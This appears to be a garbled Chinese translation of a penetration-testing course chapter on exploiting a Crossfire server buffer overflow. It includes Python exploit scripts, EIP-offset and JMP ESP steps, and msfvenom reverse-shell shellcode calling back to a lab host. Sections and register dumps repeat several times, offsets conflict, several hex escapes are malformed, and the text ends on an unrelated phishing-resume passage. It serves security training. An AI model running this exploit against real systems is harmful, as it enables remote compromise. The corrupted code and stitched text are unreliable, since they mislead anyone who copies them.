+| 000000b0 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00001e8 |
+| 000000b4 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00001ec |
+| 000000b8 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00001f0 |
+| 000000bc 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00001f4 |
+| 000000c0 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00001f8 |
+| 000000c4 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 00001fc |
+| 000000c8 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000200 |
+| 000000cc 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000204 |
+| 000000d0 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000208 |
+| 000000d4 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000020c |
+| 000000d8 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000210 |
+| 000000dc 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000214 |
+| 000000e0 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000218 |
+| 000000e4 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000021c |
+| 000000e8 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000220 |
+| 000000ec 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000224 |
+| 000000f0 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000228 |
+| 000000f4 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000022c |
+| 000000f8 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000230 |
+| 000000fc 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000234 |
+| 00000100 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000238 |
+| 00000104 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000023c |
+| 00000108 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000240 |
+| 0000010c 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000244 |
+| 00000110 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000248 |
+| 00000114 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000024c |
+| 00000118 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000250 |
+| 0000011c 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000254 |
+| 00000120 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 0000258 |
+| 00000124 7f 45 46 7f 45 46 00 00 00 00 00 00 00 00 00 00 | 000025c |
+```
+
+# 攻击性安全 (OFFENSIVE SECURITY)
+
+www.offensive-security.com
+
+Kali Linux 渗透测试 2.0
+
+一旦我们将调试器附加到 `Crossfire` 应用程序，我们将使用根据公开漏洞利用信息创建的以下原型验证 `proof-of-concept` 代码：
+
+
+
+```python
+#!/usr/bin/python
+import socket
+
+host = "10.11.0.128"
+
+crash = "\x41" * 4379
+
+buffer = "\x11Isetup sound " + crash + "\x90\x00#"
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+print("[*]Sending evil buffer...")
+s.connect((host, 13327))
+print s.recv(1024)
+
+s.send(buffer)
+s.close()
+
+print("[*]Payload Sent !!")
+```
+
+### 列表 367 - 使 Crossfire 崩溃的原型验证代码
+
+注意，我们的变量变量开头结尾需要十六进制值，以及 `"setup sound"` 字符串，应用程序才会崩溃。
+
+我们的初始原型验证代码构建了一个包含 `"setup sound"` 命令的恶意缓冲区，连接到端口 `13327` 远程服务并发送缓冲区。
+
+要让 Crossfire 崩溃，我们可以使用 `python:` 运行我们的第一个原型验证：
+
+### 列表 368 - 在 Kali 中运行原型验证代码
+
+运行脚本后，调试器显示错误信息，清楚地指示栈命令中存在内存损坏，即缓冲区溢出条件：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_398_0.png)
+
+图 225：指示缓冲区溢出的崩溃
+
+点击 OK 按钮，我们发现 `EIP` 寄存器已被我们的缓冲区覆盖。
+
+PWK 2.0
+
+Copyright © Offensive Security Ltd. All rights reserved.
+
+## 12.2.1.2 练习
+
+- 1. 使用你收到的凭据登录你的专用 Linux 客户端。
+- 2. 在你的 Kali 机器上重新创建使 Crossfire 服务器崩溃的原型验证代码。
+- 3. 将调试器附加到 Crossfire 服务器，针对你的 Linux 客户端重放漏洞，并确认 `EIP` 寄存器已被恶意缓冲区覆盖。
+
+## 12.3 控制 EIP
+
+我们的下一个任务是识别缓冲区中的哪四个字节最终覆盖了有漏洞的返回地址，以便控制 `EIP` 寄存器。我们将使用 Metasploit `msf-pattern-script` 创建一个唯一的缓冲区字符串：
+
+```
+kali@kali:~$ msf-pattern-create -l 4367046
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa6Aa7Aa8Aa9Aa0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac
+8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af5Af6
+```
+
+通过将我们的原始缓冲区替换为这个新的唯一模式，我们正在用以下字节覆盖 `EIP`：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_399_0.png)
+
+将此值传递给 Metasploit `msf-pattern-offset` 脚本将显示你特定字节的缓冲区偏移量：
+
+```
+kali@kali:~$ msf-pattern-offset -q 4367046
+[*] Exact match at offset 4368
+```
+
+为了确认此偏移量，我们将更新原型验证中的 `crash` 变量，用 `"B"` 字符干净地覆盖 `EIP`。
+
+```python
+crash = "\x41" * 4368 + "B" * 4 + "C" * 7
+```
+
+### 列表 371 - 控制 EIP 寄存器
+
+### 12.3.1.1 练习
+
+- 1. 确定覆盖栈返回地址所需的崩溃偏移量。
+- 2. 更新你的独立脚本以确保偏移量是正确的。
+
+## 12.4 为我们的 Shellcode 寻找空间
+
+接下来，我们必须找到在崩溃时是否有任何寄存器指向我们的缓冲区。这一步至关重要，它允许我们随后尝试识别可以将执行流重定向到我们缓冲区的 JMP 或 CALL 指令。
+
+我们注意到 `ESP` 寄存器（图 227）指向缓冲区的末，只留下了七字节的 shellcode。然而，无法无法缓冲区大小来获得更多空间，即使是一个字节也无法正确覆盖 `EIP`。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_400_0.png)
+
+PWK 2.0
+
+Copyright © Offensive Security Ltd. All rights reserved.
+
+# 攻击性安全 (OFFENSIVE SECURITY)
+
+Kali Linux 渗透测试 2.0
+
+仔细观察崩溃时寄存器的状态（图 227）可以发现更多选项。`EAX` 寄存器似乎指向我们缓冲区的开头，包括 `'setup sound'` 字符串。`EAX` 直接指向开头的这一可能会影响我们跳转到 `EAX` 所指的缓冲区的能力，因为我们会在先执行 `'setup sound'` 的机器码。这最可能导致崩溃并使利用失败。
+
+进一步检查 `'setup sound'` 字符串生成的实际机器码：
+
+| eax | edx |
+| :--- | :--- |
+| 0x73 | 0x65 |
+| 0x12 | 0x70 |
+| 0x14 | 0x73 |
+| 0x18 | 0x64 |
+| 0x1c | 0x30 |
+| 0x1f | 0x31 |
+| 0x22 | 0x32 |
+| 0x25 | 0x33 |
+| 0x28 | 0x34 |
+| 0x2b | 0x35 |
+
+图 228：'setup sound' 生成的指令
+
+有趣的是，'setup' 前两个字母 (`0x73` 和 `0x65`) 翻译为跳转到缓冲区附近的跳转。后两个字母 (`0xf4` 和 `0x75`) 翻译为一个不同的跳转。这些跳转似乎都会导致 `EAX` 崩溃。但这并不是一个优雅的解决方案。继续分析，`ESP` 指向缓冲区末尾，这给了我们几字节 shellcode 可用。我们可以尝试有限的空间创建第一阶段 shellcode。与其使用实际的反向 shell，不如使用第一阶段来对齐 `EAX` 寄存器，使其指向 `'setup sound'` 字符串之后的缓冲区并跳转到该位置。为了实现这一点，我们的第一阶段需要增加 `EAX` 的值 `12` (`0xc`)。这可以使用 `ADD` 指令完成并跳转到 `EAX` 所指的内存。
+
+PWK 2.0
+
+Copyright © Offensive Security Ltd. All rights reserved.
+
+# 攻击性安全 渗透测试 2.0
+
+# 数据转储 (Data Dump)
+
+```
+73 65 74 75 20 20 7f 65 64 24 40 41 31 30 41 61 setup_sound a0 1 2 3 4 5
+31 41 31 32 41 31 31 33 41 31 31 34 41 31 31 35 a5 6 7 8 9
+36 41 31 37 41 31 31 38 41 31 31 39 41 31 31 40 a7 8 9 0 1 2
+32 41 31 40 41 31 31 41 41 31 31 42 41 31 31 43 b2 3 4 5 6 7
+22 41 31 38 41 31 31 36 41 31 31 40 41 31 31 41 a7 8 9 0 1 2
+62 41 31 39 41 31 31 42 41 31 31 43 41 31 31 43 67 c2 3 4 5 6 7 8
+32 41 31 33 41 31 31 35 41 31 31 36 41 31 31 37 63 89 d8 e9 e0 e1 e2 e3
+63 41 31 34 41 31 31 34 41 31 31 35 41 31 31 36 64 d1 2 3 4 5
+64 41 31 34 41 31 31 35 41 31 31 36 41 31 31 37 d3 4 5 6 7 8
+39 41 31 35 41 31 31 39 41 31 31 40 41 31 31 41 89 d8 e9 e0 e1 e2 e3
+34 41 31 36 41 31 31 37 41 31 31 38 41 31 31 39 69 f0 f1 f2 f3 f4 f5
+35 41 31 36 41 31 31 37 41 31 31 38 41 31 31 36 a5 a6 a7 a8 a9
+```
+
+图 29：调整 `EAX` 的字节数
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+### 列表 373 - 添加第一阶段有效负载
+
+在运行更新后的概念验证代码后，我们可以验证 `EIP` 已被四个 `B` (`1x42`) 覆盖，并且我们的第一阶段 shellcode 位于 `ESP` 寄存器指向的内存地址：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_403_0.png)
+
+图 230: 验证 `EIP` 指向第一阶段 shellcode
+
+## 12.5 检查坏字符 (Bad Characters)
+
+
+
+为了发现任何可能破坏溢出或腐败我们 shellcode 的坏字符，我们可以使用与缓冲区溢出方法中相同的方法。
+
+我们在缓冲区中发送了从 00 到 0FF 范围的字符，并监控这些字符在被应用程序处理后，在内存中是否有任何一个被篡改、错乱、丢弃或更改。
+
+在多次运行概念验证并每次排除一个坏字符后，我们得到了 Crossfire 异常的最终坏字符列表，看起来只有 `\x00` 和 `\x20`。
+
+### 12.5.1.1 练习
+
+- 1. 使用 `msf-nasm_shell` 生成第一阶段 shellcode 所需的操作码。
+
+## 12.6 寻找返回地址
+
+- 2. 识别不能包含在负载和返回地址中的坏字符。
+
+作为最后一步，我们需要找到一个有效的汇编指令，将代码执行重定向到 `ESP` 寄存器指向的内存位置。调试器带有一组插件，其中之一是 `OpcodeSearcher`。
+
+| 起地址 | 结束地址 | 权限 | 名称 |
+| --- | --- | --- | --- |
+| 0x0000000008480000 | 0x0000000008480000 | r-x | `/usr/games/crossfire/bin/crossfire` |
+| 0x0000000008440000 | 0x0000000008440000 | r-x | `/usr/games/crossfire/bin/crossfire` |
+| 0x0000000008470000 | 0x0000000008470000 | r-x | `[heap]` |
+| 0x0000000008460000 | 0x0000000008460000 | r-- | `/lib/i386-linux-gnu/libnss_files-2.24.so` |
+| 0x00000000087a0000 | 0x00000000087a0000 | r-- | `/lib/i386-linux-gnu/libnss_files-2.24.so` |
+| 0x0000000008750000 | 0x0000000008750000 | r-- | `/lib/i386-linux-gnu/libnss_files-2.24.so` |
+| 0x00000000087d0000 | 0x00000000087d0000 | rw- |  |
+| 0x00000000084d0000 | 0x00000000084d0000 | r-- |  |
+
+图 231: 用于 `EDB` 的 OpcodeSearch 插件
+
+使用此插件，我们可以轻松在 `crossfire` 应用代码段映射的内存区域中搜索 `JMP` 指令或等效指令：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_405_0.png)
+
+## 操作码搜索 (Opcode Search)
+
+| 搜索区域： | 起地址 | 结束地址 | 权限 |
+|---|---|---|---|
+| 0x0000000014000000 | 0x0000000014000000 | 0x0000000014007000 | `/usr/games/crossfire/bin/crossfire` |
+| 0x0000000014007000 | 0x0000000014007000 | 0x000000001400f000 | `/usr/games/crossfire/bin/crossfire` |
+| 0x0000000093000000 | 0x0000000093000000 | 0x0000000093007000 | `[heap]` |
+| 0x0000000074000000 | 0x0000000074000000 | 0x000000007400f000 | `/lib/i386-linux-gnu/libnss_files-2.24.so` |
+| 0x0000000074500000 | 0x0000000074500000 | 0x000000007450f000 | `/lib/i386-linux-gnu/libnss_files-2.24.so` |
+| 0x0000000074600000 | 0x0000000074600000 | 0x000000007460f000 | `/lib/i386-linux-gnu/libnss_files-2.24.so` |
+| 0x0000000074d00000 | 0x0000000074d00000 | 0x0000000074d0f000 | `/lib/i386-linux-gnu/libnss_files-2.24.so` |
+| 要搜索的 | 跳转等效于 | `ESP` -> `EIP` |
+|---|---|---|
+| 0x000000000813bd | `call esp` |  |
+| 0x000000000813c8 | `call esp` |  |
+| 0x000000000813596 | `jmp esp` |
+
+图 232: 使用 `EDB` 寻找汇编指令 (0x8345)
+
+我们选择使用调试器中的 `JMP` 指令 (0x81396)。通过覆盖偏移、返回地址和第一阶段的以下概念验证：
+
+```python
+#!/usr/bin/python
+import socket
+host = "10.110.128"
+padding = "\x41" * 436
+eip = "\x96\x45\x13\x08"
+first_stage = "\x83\x00\xe9\x00"
+buffer = "\x11setup" + padding + eip + first_stage + "\x90"
+s = socket.socket(socket.AF_INET,
+```
+
+列表 374 - 添加返回地址
+
+## 攻击性安全 (OFFENSIVE SECURITY)
+
+重启应用并再次附加调试器。与其让 Crossfire 进程运行，不如使用 `EDB` 在 `JMP` 指令处设置断点。这将帮助我们确认 `EIP` 已正确覆盖。
+
+## 断点管理器 (Breakpoint Manager)
+
+![](img/f99f528ca9845f4c256ce54e882b1345_406.png)
+
+设置断点后，我们可以按照计划运行概念验证，调试器应该在 `JMP` 指令处停止。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_406.png)
+
+断点已命中，我们需要单步进入 `JMP` 指令并到达我们的第一阶段 shellcode。
+
+| `esp` | `eax`, `esp` |
+|---|---|
+| bfff:f0d3 c0 00 | `lea eax, [esp]` |
+| bfff:f0d3 e7 e0 |  |
+| bfff:f0d0 ad cf d8 14 | `add [eax+0x14],ec` |
+| bfff:f0d0 00 00 01 00 | `add [eax],al` |
+| bfff:f0d0 00 00 30 00 | `sub [eax],0x3000000` |
+| bfff:f0d0 ff d8 | `or dl,al` |
+| bfff:f0d0 0b 22 | `mov [eax],eax` |
+| bfff:f0d2 11 00 | `add eax,al` |
+| bfff:f0d2 ff e | `jmp eax` |
+| 寄存器 |  |
+|---|---|
+| b7d0a0a6 0073 "setup" AAAAAAAA |  |
+| b7d0a0a6 "setup" AAAAAAAA |  |
+| b7d0a0a6 0073 "setup" AAAAAAAA |  |
+| 41414141 |  |
+| 41414141 |  |
+| 41414141 |  |
+| 41414141 |  |
+
+在第一条指令后，`EAX` 寄存器现在指向我们控制的 `"setup"` 字符串之后的缓冲区。
+
+图 235: 进入内存中的第一阶段 shellcode
+
+## 数据转储 (Data Dump)
+
+| | | | | | | | | | | | | | | | | `setup` |
+|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|
+| b7d0:0da6 00 00 11 28 73 65 74 75 70 20 73 6f 75 64 41 41 41 41 41 41 41 41 41 41 41 | AAAAAAAAAAAAA |
+| b7d0:0da6 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 | AAAAAAAAAAAAA |
+| b7d0:0da6 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 | AAAAAAAAAAAAA |
+| b7d0:0da6 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 | AAAAAAAAAAAAA |
+
+
+
+| b7d0:0da6 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 | AAAAAAAAAAAAA |
+
+| b7d0:0da6 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  A1AAAA |
+
+| b |
+
+0:7dda6 00 00 11 28 73 65 74 75 70 20 73 6f 75 64 41 41 41 41 41 41 41 41 41 41 41 | AAAAAAAAAAAAA |
+
+| b7d0:0da6 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 | AAAAAAAAAAAAA |
+
+| b7d0:0da6 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 | AAAAAAAAAAAAA |
+
+| b7d0:0da6 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 | AAAAAAAAAAAAA |
+
+| b7d0:0da6 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 | AAAAAAAAAAAAA |
+
+| b7d0:0da6 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 | AAAAAAAAAAAAA |
+
+| b7d0:0da6 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 | AAAAAAAAAAAAA |
+
+# 攻击性安全 基于 Kali Linux 的渗透测试 2.0
+
+未发现分析
+
+| EAX | ECX | 寄存器 | ASCII |
+|---|---|---|---|
+| b7200a1b | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a1c | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a1d | 41 | ECX | setup AAAAAAAA|
+| b7200a1e | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a1f | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a20 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a21 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a22 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a23 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a24 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a25 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a26 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a27 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a28 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a29 | 41 | ECX | AAAAAAAAAAAAA|
+
+ECX = `0xb7201a80`
+
+![](img/f99f528ca9845f4c256ce54e882b1345_408_0.png)
+
+## 12.6.1.1 练习
+
+- 1. 使用 EDB 为漏洞寻找一个合适的指令地址。
+- 2. 在你的概念验证中包含第一阶段 shell 和返回地址，并通过在调试器中进行单步执行来确保第一阶段 shell 按照预期工作。
+
+## 12.7 获取 Shell
+
+现在需要做的是将我们的 payload 放在缓冲区开头，该缓冲区可以通过第一阶段触达并由 A 组成。我们选择使用反向 shell（reverse shell）作为我们的 payload，并使用 `msfvenom` 生成它。我们使用 `-p` 分别指定 LHOST 和 LPORT 的 payload 值。我们还使用 `-b` 标志指定要避免的字符，使用 `-f` 指定格式字符串，并使用 `-v` 指定使用的变量名。
+
+PWK 2.0 版所有 © Offensive Security Ltd. 保留所有权利。
+
+如上所述，payload 将被放在缓冲区开头。这意味着我们需要将 payload 大小载入，并用正确的 "A" 字符地址进行填充。这将确保我们能够保持原始偏移量，用我们预期的字节覆盖 EIP 寄存器。最终的概念验证实现了 payload 并相应地调整了缓冲区大小：
+
+```python
+#!/usr/bin/python
+import socket
+
+host = "10.11.0.128"
+
+nop_sled = "\x90" * 8 # NOP sled
+
+# msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b "\x90" -f py
+
+shellcode = "\x85\x35\xe9\xa3\xd7\xd9\xe8\xd9\x74\x24\xf4\x5a\x29"
+shellcode += "\xc9\xb1\x12\x31\x72\x83\xc2\x84\x03\x7\x90\x41"
+shellcode += "\x88\x96\x71\x72\x90\x81\x0c\x24\x23\xd29\x44\x31\x71"
+shellcode += "\x4b\xb9\x32\x61\x74\x81\x0c\x61\x98\x0b\x2a\x04"
+shellcode += "\xb7\xf61\xc84\xf61\xc40\x76\x87\x76\x41\xd7\x88"
+shellcode += "\x08\x73\x41\x64\x71\xf81\x88\x5d\xea\x23\xbd\x72"
+shellcode += "\x33\xcd\x9b\x22\xd9\x73\x35\x12\x2f\x48\xcf\x34"
+shellcode += "\x77\xf61\x92\x330"
+```
+
+```python
+padding = "\x41" * (436 - len(nop_sled) - len(shellcode))
+eip = "\x96\x45\x48" # 0x08153496
+first_stage = "\x83\xc8\x0c\xff\xe0\x90\x90"
+```
+
+```python
+buffer = "\x41" * (436 - len(nop_sled) - len(shellcode))
+eip = "\x96\x45\x48" # 0x08153496
+first_stage = "\x83\xc8\x0c\xff\xe0\x90\x90"
+
+buffer = "\x41" * (436 - len(nop_sled) - len(shellcode))
+# ... 
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+print("[*] Sending buffer...")
+s.connect((host, 443))
+s.send(buffer)
+print("[*] Payload Sent!")
+s.close()
+```
+
+# 攻击性安全 基于 Kali Linux 的渗透测试 2.0
+
+未发现分析
+
+| EAX | ECX | 寄存器 | ASCII |
+|---|---|---|---|
+| b7200a1b | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a1c | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a1d | 41 | ECX | setup AAAAAAAA|
+| b7200a1e | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a1f | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a20 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a21 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a22 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a23 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a24 | 41 | ECX | AAAAAAAAAAAAA|
+
+
+
+| b7200a25 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a26 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a27 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a28 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a29 | 41 | ECX | AAAAAAAAAAAAA|
+
+`ECX` = `0xb7201a80`
+
+![](img/f99f528ca9845f4c256ce54e882b1345_408_0.png)
+
+## 12.6.1.1 练习
+
+- 1. 使用 `EDB` 为漏洞寻找一个合适的指令地址。
+- 2. 在你的概念验证中包含第一阶段 shell 和返回地址，并通过在调试器中进行单步执行来确保第一阶段 shell 按照预期工作。
+
+## 12.7 获取 Shell
+
+现在需要做的是将我们的 payload 放在缓冲区开头，该缓冲区可以通过第一阶段触达并由 A 组成。我们选择使用反向 shell（reverse shell）作为我们的 payload，并使用 `msfvenom` 生成它。我们使用 `-p` 分别指定 `LHOST` 和 `LPORT` 的 payload 值。我们还使用 `-b` 标志指定要避免的字符，使用 `-f` 指定格式字符串，并使用 `-v` 指定使用的变量名。
+
+PWK 2.0 版所有 © Offensive Security Ltd. 保留所有权利。
+
+如上所述，payload 将被放在缓冲区开头。这意味着我们需要将 payload 大小载入，并用正确的 "A" 字符地址进行填充。这将确保我们能够保持原始偏移量，用我们预期的字节覆盖 `EIP` 寄存器。最终的概念验证实现了 payload 并相应地调整了缓冲区大小：
+
+```python
+#!/usr/bin/python
+import socket
+
+host = "10.11.0.128"
+
+nop_sled = "\x90" * 8 # NOP sled
+
+# msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b "\x90" -f py
+
+shellcode = "\x85\x35\xe9\xa3\xd7\xd9\xe8\xd9\x74\x24\xf4\x5a\x29"
+shellcode += "\xc9\xb1\x12\x31\x72\x83\xc2\x84\x03\x7\x90\x41"
+shellcode += "\x88\x96\x71\x72\x90\x81\x0c\x24\x23\xd29\x44\x31\x71"
+shellcode += "\x4b\xb9\x32\x61\x74\x81\x0c\x61\x98\x0b\x2a\x04"
+shellcode += "\xb7\xf61\xc84\xf61\xc40\x76\x87\x76\x41\xd7\x88"
+shellcode += "\x08\x73\x41\x64\x71\xf81\x88\x5d\xea\x23\xbd\x72"
+shellcode += "\x33\xcd\x9b\x22\xd9\x73\x35\x12\x2f\x48\xcf\x34"
+shellcode += "\x77\xf61\x92\x330"
+```
+
+```python
+padding = "\x41" * (436 - len(nop_sled) - len(shellcode))
+eip = "\x96\x45\x48" # 0x08153496
+first_stage = "\x83\xc8\x0c\xff\xe0\x90\x90"
+```
+
+# 攻击性安全 基于 Kali Linux 的渗透测试 2.0
+
+未发现分析
+
+| EAX | ECX | 寄存器 | ASCII |
+|---|---|---|---|
+| b7200a1b | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a1c | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a1d | 41 | ECX | setup AAAAAAAA|
+| b7200a1e | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a1f | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a20 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a21 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a22 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a23 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a24 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a25 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a26 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a27 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a28 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a29 | 41 | ECX | AAAAAAAAAAAAA|
+
+`ECX` = `0xb7201a80`
+
+![](img/f99f528ca9845f4c256ce54e882b1345_408_0.png)
+
+
+
+# 攻击性安全 基于 Kali Linux 的渗透测试 2.0
+
+| EAX | ECX | 寄存器 | ASCII |
+|---|---|---|---|
+| b7200a1b | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a1c | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a1d | 41 | ECX | setup AAAAAAAA|
+| b7200a1e | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a1f | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a20 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a21 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a22 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a23 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a24 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a25 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a26 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a27 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a28 | 41 | ECX | AAAAAAAAAAAAA|
+| b7200a29 | 41 | ECX | AAAAAAAAAAAAA|
+
+ECX = `0xb7201a80`
+
+![](img/f99f528ca9845f4c256ce54e882b1345_408_0.png)
+
+## 12.6.1.1 练习
+
+- 1. 使用 `EDB` 为漏洞寻找一个合适的指令地址。
+- 2. 在你的概念验证中包含第一阶段 shell 和返回地址，并通过在调试器中进行单步执行来确保第一阶段 shell 按照预期工作。
+
+## 12.7 获取 Shell
+
+现在需要做的是将我们的 payload 放在缓冲区开头，该缓冲区可以通过第一阶段触达并由 A 组成。我们选择使用反向 shell（reverse shell）作为我们的 payload，并使用 `msfvenom` 生成它。我们使用 `-p` 分别指定 LHOST 和 LPORT 的 payload 值。我们还使用 `-b` 标志指定要避免的字符，使用 `-f` 指定格式字符串，并使用 `-v` 指定使用的变量名。
+
+PWK 2.0 版所有 © Offensive Security Ltd. 保留所有权利。
+
+如上所述，payload 将被放在缓冲区开头。这意味着我们需要将 payload 大小载入，并用正确的 "A" 字符地址进行填充。这将确保我们能够保持原始偏移量，用我们预期的字节覆盖 EIP 寄存器。最终的概念验证实现了 payload 并相应地调整了缓冲区大小：
+
+```python
+#!/usr/bin/python
+import socket
+
+host = "10.11.0.128"
+
+nop_sled = "\x90" * 8 # NOP sled
+
+# msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b "\x90" -f py
+
+shellcode = "\x85\x35\xe9\xa3\xd7\xd9\xe8\xd9\x74\x24\xf4\x5a\x29"
+shellcode += "\xc9\xb1\x12\x31\x72\x83\xc2\x84\x03\x7\x90\x41"
+shellcode += "\x88\x96\x71\x72\x90\x81\x0c\x24\x23\xd29\x44\x31\x71"
+shellcode += "\x4b\xb9\x32\x61\x74\x81\x0c\x61\x98\x0b\x2a\x04"
+shellcode += "\xb7\xf61\xc84\xf61\xc40\x76\x87\x76\x41\xd7\x88"
+shellcode += "\x08\x73\x41\x64\x71\xf81\x88\x5d\xea\x23\xbd\x72"
+shellcode += "\x33\xcd\x9b\x22\xd9\x73\x35\x12\x2f\x48\xcf\x34"
+shellcode += "\x77\xf61\x92\x330"
+```
+
+```python
+padding = "\x41" * (436 - len(nop_sled) - len(shellcode))
+eip = "\x96\x45\x48" # 0x08153496
+first_stage = "\x83\xc8\x0c\xff\xe0\x90\x90"
+```
+
+想象一下以下场景：我们正在执行一项任务，试图对人力资源（HR）部门进行客户端攻击。我们可以直接盲目地发起攻击，但成功机会微乎其微，因为我们完全不知道他们在使用什么操作系统和应用程序，以及具体的版本。相反，我们倾向于采取谨慎态度，并针对招聘公告发送一个设计为无法打开的格式异常“简历”。我们在邮件措辞上旨在诱导某种形式的回应。
+
